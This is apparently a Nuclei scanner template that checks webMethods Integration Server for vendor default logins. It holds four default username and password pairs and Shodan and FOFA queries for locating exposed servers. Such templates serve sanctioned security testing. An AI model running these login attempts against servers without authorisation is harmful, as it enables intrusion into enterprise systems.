id: webmethod-integration-default-login

info:
  name: WebMethod Integration Server - Default Login
  author: ChristianPoeschl,OleWagner,usdAG
  severity: high
  description: WebMethod Integration Server default login credentials were discovered.
  reference:
    - https://documentation.softwareag.com/
  classification:
    cpe: cpe:2.3:a:softwareag:webmethods:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 5
    vendor: softwareag
    product: webmethods
    shodan-query: http.favicon.hash:"-234335289"
    fofa-query: icon_hash=-234335289
    runzero-match: service["favicon.ico.image.mmh3"] == "-234335289"
  tags: default-login,webmethod
flow: http(1) && http(2)

http:
  - method: GET
    path:
      - "{{BaseURL}}/invoke/pub.file/getFile"

    matchers:
      - type: dsl
        dsl:
          - status_code == 403 || status_code == 401
          - contains(to_lower(header), 'integration server')
        condition: and
        internal: true

  - method: GET
    path:
      - "{{BaseURL}}/invoke/pub.file/getFile"

    headers:
      Authorization: "{{base64(username + ':' + password)}}"
      Cookie: ssnid=
    cookie-reuse: false
    threads: 10
    attack: pitchfork
    payloads:
      username:
        - Administrator
        - Developer
        - Replicator
        - SAPUser
      password:
        - manage
        - isdev
        - iscopy
        - 22101999

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - com.wm.app.b2b.server
          - No filename supplied
        condition: and

      - type: word
        words:
          - com.wm.app.b2b.server.AccessException
          - Invalid credentials
        negative: true
        condition: and

